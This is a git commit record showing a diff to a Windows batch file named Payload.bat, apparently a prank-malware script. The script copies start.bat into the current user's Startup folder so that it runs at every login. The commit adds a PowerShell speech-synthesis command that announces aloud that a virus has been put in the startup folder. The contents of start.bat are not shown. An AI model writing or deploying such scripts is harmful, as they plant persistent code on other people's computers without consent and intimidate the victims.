20b4485a330d6d28ed29e66c5df7306b0e23892b
DanielNov2014 <michaelvinthermoller@gmail.com>
2025-04-18 10:28:21 +0200

    Update Payload.bat

--- Payload.bat
+++ Payload.bat
@@ -1,3 +1,3 @@
 @echo off
 copy "./start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
+PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have put some virus in your startup folder better luck')"
